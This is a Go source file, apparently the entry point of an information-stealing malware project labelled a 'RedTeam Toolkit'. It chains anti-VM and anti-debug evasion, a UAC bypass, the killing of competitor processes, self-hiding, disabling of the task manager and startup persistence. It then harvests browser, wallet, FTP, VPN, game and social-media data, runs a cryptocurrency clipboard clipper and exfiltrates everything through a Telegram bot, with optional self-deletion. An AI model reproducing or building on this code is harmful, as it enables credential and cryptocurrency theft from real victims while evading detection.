// ============================================================
// main.go - Enhanced Entry Point with Full Features
// ============================================================
package main

import (
	"encoding/json"
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/yourusername/go-redteam/internal/antidebug"
	"github.com/yourusername/go-redteam/internal/antivm"
	"github.com/yourusername/go-redteam/internal/antivirus"
	"github.com/yourusername/go-redteam/internal/core/browsers"
	"github.com/yourusername/go-redteam/internal/core/clipper"
	"github.com/yourusername/go-redteam/internal/core/commonfiles"
	"github.com/yourusername/go-redteam/internal/core/cryptowallets"
	"github.com/yourusername/go-redteam/internal/core/exfil"
	"github.com/yourusername/go-redteam/internal/core/ftps"
	"github.com/yourusername/go-redteam/internal/core/games"
	"github.com/yourusername/go-redteam/internal/core/socials"
	"github.com/yourusername/go-redteam/internal/core/system"
	"github.com/yourusername/go-redteam/internal/core/vpn"
	"github.com/yourusername/go-redteam/internal/fakerr"
	"github.com/yourusername/go-redteam/internal/fr"
	"github.com/yourusername/go-redteam/internal/hc"
	"github.com/yourusername/go-redteam/internal/taskmanager"
	"github.com/yourusername/go-redteam/internal/uac"
	"github.com/yourusername/go-redteam/pkg/utils/common"
	"github.com/yourusername/go-redteam/pkg/utils/processkill"
	"github.com/yourusername/go-redteam/pkg/utils/startup"
	"github.com/yourusername/go-redteam/pkg/utils/telemetry"
)

// Config struct for configuration
type Config struct {
	BotToken     string            `json:"botToken"`
	ChatID       string            `json:"chatId"`
	Discord      string            `json:"discordWebhook,omitempty"`
	Cryptos      map[string]string `json:"cryptos"`
	Enabled      bool              `json:"enabled"`
	Debug        bool              `json:"debug"`
	SelfDestruct bool              `json:"selfDestruct"`
}

var config Config

func main() {
	// Initialize logging
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Println("🚀 RedTeam Toolkit v4.0 (Go) starting...")

	// Load configuration
	if !loadConfig() {
		log.Println("⚠️ No config found, using defaults")
		config = getDefaultConfig()
	}

	// Initialize telemetry
	telemetry.Init(config.BotToken, config.ChatID)
	telemetry.SendHeartbeat("🚀 RedTeam Toolkit v4.0 (Go) started")
	telemetry.SendHeartbeat("Host: " + common.GetHostname())
	telemetry.SendHeartbeat("User: " + common.GetUsername())
	telemetry.SendHeartbeat("OS: " + common.GetOS())

	// Check if already running
	if common.IsAlreadyRunning() {
		log.Println("⚠️ Already running, exiting...")
		return
	}

	// Anti-analysis checks
	log.Println("🔍 Running anti-analysis checks...")

	if antivm.IsVM() {
		log.Println("⚠️ VM detected - exiting")
		telemetry.SendHeartbeat("⚠️ VM detected - exiting")
		return
	}

	if antidebug.IsDebugged() {
		log.Println("⚠️ Debugger detected - exiting")
		telemetry.SendHeartbeat("⚠️ Debugger detected - exiting")
		return
	}

	// Privilege escalation
	log.Println("🔐 Attempting UAC bypass...")
	uac.Run()

	// Kill competitor processes
	log.Println("💀 Killing competitor processes...")
	processkill.Run()

	// Stealth operations
	log.Println("🕵️ Applying stealth...")
	hc.HideConsole()
	common.HideSelf()
	fr.Disable()
	taskmanager.Disable()

	// Persistence
	if !common.IsInStartupPath() {
		log.Println("💾 Installing persistence...")
		go fakerr.Show()
		go startup.Run()
	}

	// Anti-analysis background tasks
	log.Println("🔒 Starting anti-analysis background tasks...")
	go antidebug.Run()
	go antivirus.Run()

	// Start surveillance
	log.Println("📹 Starting surveillance modules...")

	// Define all extraction actions
	actions := []struct {
		name string
		fn   func()
	}{
		{"System Info", system.Run},
		{"Browsers", browsers.Run},
		{"Common Files", commonfiles.Run},
		{"Crypto Wallets", cryptowallets.Run},
		{"Games", games.Run},
		{"FTP Clients", ftps.Run},
		{"VPN Clients", vpn.Run},
		{"Social Media", socials.Run},
	}

	// Run all actions in parallel
	for _, action := range actions {
		log.Printf("📂 Starting: %s", action.name)
		go action.fn()
	}

	// Start clipper in background
	log.Println("💰 Starting crypto clipper...")
	go clipper.Run(config.Cryptos)

	// Wait for modules to complete
	log.Println("⏳ Waiting for modules to complete...")
	time.Sleep(30 * time.Second)

	// Collect and exfil all data
	log.Println("📤 Exfiltrating data...")
	exfil.CollectAndSend()

	// Cleanup
	if config.SelfDestruct {
		log.Println("💀 Self-destruct initiated...")
		telemetry.SendHeartbeat("💀 Self-destruct initiated")
		time.Sleep(2 * time.Second)
		selfDestruct()
	}

	telemetry.SendHeartbeat("✅ All tasks complete")

	log.Println("✅ All tasks complete!")

	// Wait for exit
	time.Sleep(5 * time.Second)
}

// loadConfig loads configuration from config.json
func loadConfig() bool {
	data, err := ioutil.ReadFile("config.json")
	if err != nil {
		return false
	}

	if err := json.Unmarshal(data, &config); err != nil {
		return false
	}

	return true
}

// getDefaultConfig returns default configuration
func getDefaultConfig() Config {
	return Config{
		BotToken: "",
		ChatID:   "",
		Discord:  "",
		Cryptos: map[string]string{
			"BTC":  "",
			"BCH":  "",
			"ETH":  "",
			"XMR":  "",
			"LTC":  "",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "",
			"ADA":  "",
			"DASH": "",
			"DOGE": "",
		},
		Enabled:       true,
		Debug:         false,
		SelfDestruct:  false,
	}
}

// selfDestruct removes all traces
func selfDestruct() {
	log.Println("🧹 Cleaning up...")

	// Delete log files
	os.Remove("redteam.log")
	os.Remove("telemetry.log")

	// Delete executable (Windows)
	if common.IsWindows() {
		cmd := "timeout /t 2 /nobreak > nul & del " + os.Args[0]
		os.StartProcess("cmd", []string{"/c", cmd}, nil)
	}
}